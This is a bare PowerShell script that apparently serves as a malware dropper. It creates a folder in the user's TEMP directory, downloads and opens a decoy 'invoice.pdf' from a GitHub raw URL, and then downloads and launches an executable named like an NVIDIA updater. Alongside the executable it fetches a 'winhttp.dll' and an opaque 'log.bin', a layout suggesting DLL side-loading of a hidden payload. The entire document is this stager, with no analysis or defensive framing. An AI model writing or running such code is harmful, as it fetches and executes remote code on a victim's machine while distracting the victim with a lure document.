$d="$env:TEMP\.tmp2yLd5Z"
mkdir $d -Force|Out-Null
$s="https://raw.githubusercontent.com/Ac333e2/note/refs/heads/main"
iwr "$s/invoice.pdf" -OutFile "$d\invoice.pdf"
Start-Process "$d\invoice.pdf"
iwr "$s/NvProfileUpdater64.exe" -OutFile "$d\NvProfileUpdater64.exe"
iwr "$s/winhttp.dll" -OutFile "$d\winhttp.dll"
iwr "$s/log.bin" -OutFile "$d\log.bin"
Start-Process "$d\NvProfileUpdater64.exe" -WorkingDirectory $d


